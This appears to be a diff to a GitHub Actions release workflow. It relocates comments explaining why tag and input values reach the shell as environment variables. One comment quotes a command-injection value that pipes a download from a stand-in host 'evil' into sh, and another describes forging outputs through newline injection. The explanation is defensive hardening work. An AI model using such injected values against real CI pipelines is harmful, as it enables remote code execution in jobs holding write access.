@@ -50,7 +50,7 @@ jobs:
       is_tag: ${{ steps.v.outputs.is_tag }}
     steps:
       # The dispatch input reaches the shell as an environment variable, never as text
-      # pasted into the script. A `${{ }}` expansion is substituted before bash parses the
+      # pasted into the script. An inline expression is substituted before bash parses the
       # line, so an input of `1.0.0"; curl evil | sh; echo "` would have run as a command,
       # and an input containing a newline would have appended its own lines to
       # $GITHUB_OUTPUT — forging `is_tag=true` and turning an advertised dry run into a
@@ -306,6 +306,18 @@ jobs:
       # Linux updates come from apt rather than from inside the app — and those are the three
       # things a first-time Linux user most needs (#84). So the evergreen header is
       # prepended to the generated section rather than replacing it.
+      # $TAG and $GITHUB_REPOSITORY below are environment variables rather than inline
+      # expression expansions, for the same reason as the version input: a git tag may
+      # legally contain ';', '$', '&' and parentheses, so a crafted tag name substituted
+      # into this script would run as a command in the one job that holds contents: write.
+      #
+      # That explanation lives HERE, in a YAML comment, and not inside the run: block below.
+      # A run: block is a YAML block scalar — every line of it is part of the script string,
+      # including the ones beginning with '#', and Actions evaluates expression syntax across
+      # the whole value before bash ever sees it. Writing the two-brace token inside the block
+      # to talk *about* it therefore fails the workflow to parse with "an expression was
+      # expected", because an empty expression is not one. A YAML comment is stripped by the
+      # parser and can say anything.
       - name: Compose release notes
         env:
           GH_TOKEN: ${{ github.token }}
@@ -320,12 +332,8 @@ jobs:
           sed '/^<!--$/,/^-->$/d' .github/release-notes-header.md > notes.md
 
           # Generated separately rather than via --generate-notes, so it lands BELOW the
-          # header instead of replacing the body.
-          #
-          # $TAG and $GITHUB_REPOSITORY are environment variables rather than `${{ }}`
-          # expansions for the same reason as the version input: a git tag may legally
-          # contain ';', '$', '&' and parentheses, so a crafted tag name expanded into this
-          # script would run as a command in the one job that holds contents: write.
+          # header instead of replacing the body. See the note above this step for why the
+          # tag arrives as $TAG.
           gh api "repos/${GITHUB_REPOSITORY}/releases/generate-notes" \
             -f tag_name="$TAG" \
             --jq .body >> notes.md || echo "_(no generated notes available)_" >> notes.md
